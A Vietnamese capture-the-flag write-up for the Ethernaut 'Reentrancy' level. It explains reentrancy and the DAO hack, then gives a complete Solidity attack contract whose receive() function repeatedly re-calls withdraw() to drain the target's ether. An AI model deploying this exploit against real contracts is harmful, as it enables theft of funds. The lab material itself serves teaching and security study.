# Level 10: Reentrancy
##  ★★★☆☆
Lần này chúng ta sẽ tìm hiểu về một trong những lỗi bảo mật iconic và nghiêm trọng nhất trong smart contract đó là reentrancy attack
## Given contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```
## Reentrancy attack
- Trước khi đi vào phân tích challenge, ta cần hiểu thế nào là cuộc tấn công Reentrancy.
 - Reentracy attack là cuộc tấn công mà ở đó hacker sẽ cố gắng gọi đệ quy từ hàm rút tiền của contract, nếu contract không cẩn thận update số dư thì hacker sẽ withdraw toàn bộ tiền trong contract. 
 - Nó được thực hiện bằng cách là khi mà hacker thực hiện rút tiền từ contract, trong một contract khác ( theo ảnh dưới là Exploit contract) của hacker sẽ có fallback function mà trong fallback function đó lại tiếp tục call tới hàm ``withraw()``. Như vậy fallback function khi receive money sẽ tự động trigger và call withdraw, cứ thế lặp lại.
 
 -> thế là chúng ta vô một vòng đệ quy cho đến khi balance của contract được withdraw hết.
 ![](https://images.viblo.asia/6019738e-4648-490d-9033-8da8ae3ba291.png)
 
- Một trong những cuộc tấn công Reentrancy nổi tiếng là DAO hack, hacker đã đánh cắp 3,6 triệu ether ( hơn $50M USD ), điều này dẫn đến giá ETH bị crashed nghiêm trọng, buộc Ethereum phải tung một update quan trọng để fix. Và sự hình thành của đồng Ethereum classic bắt đầu từ đây.
- Bạn có thể đọc thêm về DAO hack tại [đây](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao)   và các loại tấn công Reentrancy tại [đây](https://viblo.asia/p/nhung-lo-hong-trieu-do-trong-ethereum-smart-contract-phan-i-ORNZqjerl0n)  
## Phân tích
- Đã gọi là low-level function thì đương nhiên nó sẽ luôn nguy hiểm, trường hợp ở đây của chúng ta là ``call``
```solidity
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
 
```
- Để chuyển tiền, ngoài ``selfdestruct()`` như đã biết, chúng ta có 3 cách là ``tranfer``, ``send`` và ``call`` . Điều mà solidity luôn khuyến nghị dùng là ``tranfer`` vì nó luôn bị revert khi giao dịch lỗi , còn send và call thì không, chúng chỉ trả về ``true/false`` . 
- Một điều để biết nữa đó là ``tranfer`` và ``send`` sẽ luôn có gas limit là 2300, nghĩa là ta chỉ thuần tùy là chuyển tiền thôi mà không thể thực hiện thêm logic nào khác . Còn ``call`` thì không giới hạn gas -> Điểm để khai thác trong reentrancy attack

> Note: Solidity sẽ tính gas dựa trên độ phức tạp của code bạn
## Solution
**Target**: Rút hết balance của smart contract.
- Check balance thì ta thấy có 0.001 ether
```javascript
await getBalance(contract.address)
0.001

```

- Compile và deploy contract này trên remix,

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceAttack {
    address public owner;
    IReentrance targetContract;
    uint targetValue = 1000000000000000;

    constructor(address _targetAddr)  {
        targetContract = IReentrance(_targetAddr);
        owner = msg.sender;
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function donateAndWithdraw() public payable {
        require(msg.value >= targetValue);
        targetContract.donate{value:msg.value}(address(this));
        targetContract.withdraw(msg.value);
    }

    function withdrawAll() public returns (bool) {
        require(msg.sender == owner, "my money!!");
        uint totalBalance = address(this).balance;
        (bool sent, ) = msg.sender.call{value:totalBalance}("");
        require(sent, "Failed to send Ether");
        return sent;
    }

    receive() external payable {
        uint targetBalance = address(targetContract).balance;
        if (targetBalance >= targetValue) {
          targetContract.withdraw(targetValue);
        }
    }
}
```
- Mình sẽ giải thích xíu về contract này sẽ tấn công như thế nào.
- Đầu tiên khi gọi donateAndWithdraw(), thì targetContract sẽ set value của ether ta gửi ``    balances[_to] = balances[_to].add(msg.value);``, sau đó hàm ``withdraw()`` sẽ được gọi và nó sẽ trigger fallback function là ``receive()`` và send số ether mà ta vừa gửi trở lại Attack contract . Vì hàm ``withdraw()`` vẫn chưa execute xong nên điều kiện ``balances[msg.sender] >= amount`` luôn đúng, ``withdraw()`` vẫn tiếp tục được gọi trong fallback function ở Attack Contract -> chúng ta vô đệ quy rút tiền.
- Cuối cùng, chúng ta dùng hàm withdrawAll() để rút hết balance có trong ``ReentranceAttack`` về ``player``.
- Check lại balance, nếu balance bằng 0 thì ta đã hoàn thành challenge này =))
```javascript
await getBalance(contract.address)
0
```
**Submit** -> Done
## Reference
- https://viblo.asia/p/nhung-lo-hong-trieu-do-trong-ethereum-smart-contract-phan-i-ORNZqjerl0n
- https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942
- https://www.gemini.com/cryptopedia/the-dao-hack-makerdao



